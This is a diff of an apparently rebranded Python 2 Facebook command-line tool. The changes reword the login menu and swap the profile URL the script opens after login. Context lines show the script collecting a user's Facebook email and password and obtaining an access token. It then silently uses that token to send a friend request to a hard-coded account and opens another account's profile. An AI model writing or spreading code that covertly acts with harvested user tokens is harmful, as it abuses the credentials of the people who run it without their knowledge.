@@ -109,9 +109,9 @@ def lisensi():
 def masuk():
 	os.system('reset')
 	print logo
-	print "\033[1;91m║--\033[1;91m> \033[1;95m1.\033[1;96m Login dulu"
+	print "\033[1;91m║--\033[1;91m> \033[1;95m1.\033[1;96m Login email"
 	print "\033[1;92m║--\033[1;91m> \033[1;95m2.\033[1;96m Login using token"
-	print "\033[1;93m║--\033[1;91m> \033[1;95m0.\033[1;96m Exit/keluar"
+	print "\033[1;93m║--\033[1;91m> \033[1;95m0.\033[1;96m Exit"
 	print "\033[1;95m║"
 	msuk = raw_input("\033[1;96m╚═\033[1;1mD \033[1;93m")
 	if msuk =="":
@@ -137,7 +137,7 @@ def login():
 	except (KeyError,IOError):
 		os.system('reset')
 		print logo
-		print('\033[1;96m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
+		print('\033[1;96m[☆] \033[1;92mLOGIN A FACEBOOK \033[1;91m[☆]')
 		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
 		pwd = getpass.getpass('\033[1;95m[+] \033[1;93mPassword \033[1;93m:\033[1;95m ')
 		tik()
@@ -168,7 +168,7 @@ def login():
 				zedd.close()
 				print '\n\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mLogin successfully'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
-				os.system('xdg-open https://m.facebook.com/ilman.gaming.52')
+				os.system('xdg-open https://m.facebook.com/AhmedAlzwage.01')
 				menu()
 			except requests.exceptions.ConnectionError:
 				print"\n\033[1;91m[!] No connection"
